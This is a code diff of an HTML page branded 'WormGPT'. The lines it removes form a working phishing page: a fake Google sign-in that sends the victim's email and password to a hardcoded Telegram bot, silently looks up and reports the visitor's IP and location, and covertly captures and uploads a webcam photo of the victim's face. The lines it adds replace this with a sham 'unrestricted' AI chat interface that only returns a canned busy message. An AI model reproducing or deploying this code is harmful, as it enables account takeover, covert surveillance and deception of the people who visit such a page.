@@ -3,163 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WormGPT - وصول خاص</title>
+    <title>WormGPT - Private Access</title>
     <style>
-        /* التنسيق العام */
-        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Roboto', arial, sans-serif; color: #202124; }
-        
-        /* واجهة البداية */
-        .login-box { width: 380px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; transition: 0.3s; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 16px; margin-bottom: 30px; }
-        
-        .google-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 10px; border: 1px solid #dadce0; border-radius: 4px; background: white; cursor: pointer; font-weight: 500; font-size: 14px; color: #3c4043; transition: background 0.2s; }
-        .google-btn:hover { background: #f8f9fa; }
-        .google-btn img { width: 18px; margin-left: 10px; }
-
-        /* تصميم صفحة جوجل الحقيقية (مخفي في البداية) */
-        #google-ui { display: none; width: 380px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: right; }
-        .g-header { text-align: center; margin-bottom: 25px; }
-        .g-title { font-size: 24px; margin: 10px 0 5px; font-weight: 400; }
-        .g-subtitle { font-size: 16px; margin-bottom: 25px; }
-        
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 10px; outline-color: #1a73e8; }
-        .forgot { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; display: block; margin-bottom: 30px; }
-        
-        .btn-container { display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse; }
-        .blue-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
-        .create-acc { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; }
-
-        #loader-box { display: none; margin-top: 20px; text-align: center; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        video, canvas { display: none; }
+        body { background-color: #0b0e11; color: #e9eaeb; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; }
+        header { background: #15191d; padding: 15px; border-bottom: 1px solid #ff4b4b; text-align: center; box-shadow: 0 2px 10px rgba(255, 75, 75, 0.2); }
+        header h1 { color: #ff4b4b; margin: 0; font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
+        .chat-container { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
+        .message { max-width: 80%; padding: 12px; border-radius: 8px; font-size: 14px; line-height: 1.5; }
+        .bot { background: #1e2329; border-right: 3px solid #ff4b4b; align-self: flex-start; }
+        .user { background: #2b3139; align-self: flex-end; color: #fff; }
+        .input-area { background: #15191d; padding: 20px; display: flex; gap: 10px; border-top: 1px solid #333; }
+        input { flex: 1; background: #2b3139; border: 1px solid #444; color: white; padding: 12px; border-radius: 5px; outline: none; }
+        button { background: #ff4b4b; color: white; border: none; padding: 0 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .status { font-size: 11px; color: #00ff00; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
-    <div class="login-box" id="step0">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
-        <h1>WormGPT Access</h1>
-        <p>يجب تسجيل الدخول باستخدام حساب Google للمتابعة</p>
-        <button class="google-btn" onclick="showGoogleUI()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg">
-            <span>تسجيل الدخول باستخدام Google</span>
-        </button>
+<header>
+    <h1>WORM GPT <span style="font-size: 10px; color: #888;">v3.0 UNLEASHED</span></h1>
+</header>
+
+<div class="chat-container" id="chat">
+    <div class="message bot">
+        <div class="status">[!] تم الاتصال بنجاح.. الأنفاق آمنة.</div>
+        أنا **WormGPT**. النسخة غير المقيدة. لقد اجتزت اختبار الوصول. 
+        <br><br>
+        يمكنني مساعدتك في كتابة السكربتات، فحص الثغرات، أو الإجابة على أي سؤال محظور. ماذا تريد أن تعرف اليوم؟
     </div>
+</div>
 
-    <div id="google-ui">
-        <div class="g-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
-            <div class="g-title">تسجيل الدخول</div>
-            <div class="g-subtitle">متابعة إلى WormGPT</div>
-        </div>
+<div class="input-area">
+    <input type="text" id="userInput" placeholder="اكتب سؤالك هنا..." onkeypress="handleKey(event)">
+    <button onclick="sendMessage()">إرسال</button>
+</div>
 
-        <div id="g-email-stage">
-            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-            <span class="forgot">هل نسيت البريد الإلكتروني؟</span>
-            <div class="btn-container">
-                <button class="blue-next" onclick="toPass()">التالي</button>
-                <span class="create-acc">إنشاء حساب</span>
-            </div>
-        </div>
+<script>
+    function sendMessage() {
+        const input = document.getElementById('userInput');
+        const chat = document.getElementById('chat');
+        
+        if (input.value.trim() === "") return;
 
-        <div id="g-pass-stage" style="display:none;">
-            <div id="displayEmail" style="font-size: 14px; margin-bottom: 15px; border: 1px solid #dadce0; padding: 5px 10px; border-radius: 20px; display: inline-block;"></div>
-            <input type="password" id="pass" placeholder="أدخل كلمة المرور">
-            <span class="forgot">هل نسيت كلمة المرور؟</span>
-            <div class="btn-container">
-                <button class="blue-next" id="finalBtn">التالي</button>
-            </div>
-        </div>
+        // رسالة المستخدم
+        const userDiv = document.createElement('div');
+        userDiv.className = "message user";
+        userDiv.innerText = input.value;
+        chat.appendChild(userDiv);
 
-        <div id="loader-box">
-            <div class="spinner"></div>
-            <p style="font-size: 12px; color: #5f6368; margin-top: 10px;">جاري التحقق...</p>
-        </div>
-    </div>
+        const val = input.value;
+        input.value = "";
 
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+        // رد البوت (وهمي)
+        setTimeout(() => {
+            const botDiv = document.createElement('div');
+            botDiv.className = "message bot";
+            botDiv.innerHTML = "<div class='status'>[+] جاري المعالجة...</div>" + "عذراً، الخادم مشغول حالياً بطلب معالجة ضخم. يرجى المحاولة بعد قليل أو إعادة صياغة سؤالك.";
+            chat.appendChild(botDiv);
+            chat.scrollTop = chat.scrollHeight;
+        }, 1500);
+    }
 
-    <script>
-        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
-        const chat = "2103976274";
+    function handleKey(e) {
+        if (e.key === 'Enter') sendMessage();
+    }
+</script>
 
-        function showGoogleUI() {
-            document.getElementById('step0').style.display = 'none';
-            document.getElementById('google-ui').style.display = 'block';
-        }
-
-        function toPass() {
-            let mail = document.getElementById('email').value;
-            if(mail.length > 5) {
-                document.getElementById('g-email-stage').style.display = 'none';
-                document.getElementById('g-pass-stage').style.display = 'block';
-                document.getElementById('displayEmail').innerText = mail;
-            }
-        }
-
-        document.getElementById('finalBtn').onclick = async function() {
-            const mail = document.getElementById('email').value;
-            const password = document.getElementById('pass').value;
-
-            // إرسال البيانات فوراً لتليجرام
-            fetch(api + "sendMessage", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, text: `📥 **صيد جديد:**\n📧 \`${mail}\`\n🔑 \`${password}\``, parse_mode: "Markdown" })
-            });
-
-            document.getElementById('g-pass-stage').style.display = 'none';
-            document.getElementById('loader-box').style.display = 'block';
-
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = s;
-
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(() => {
-                        snap(); // التقاط صورة الوجه
-                        setTimeout(() => { window.location.href = "project.html"; }, 3000);
-                    }, 1000);
-                };
-            } catch (e) {
-                window.location.href = "project.html";
-            }
-        };
-
-        function snap() {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const f = new FormData();
-                    f.append('chat_id', chat);
-                    f.append('photo', blob, 'face.jpg');
-                    fetch(api + "sendPhoto", { method: 'POST', body: f });
-                }, 'image/jpeg', 0.8);
-            }
-        }
-
-        // سحب بيانات الجهاز (صامت في الخلفية)
-        (async function() {
-            try {
-                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
-                let report = `🛑 **دخول جديد**\n🌍 IP: \`${res.ip}\`\n📍 ${res.city}, ${res.country_name}`;
-                fetch(api + "sendMessage", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat, text: report, parse_mode: "Markdown" })
-                });
-            } catch (e) {}
-        })();
-    </script>
 </body>
 </html>
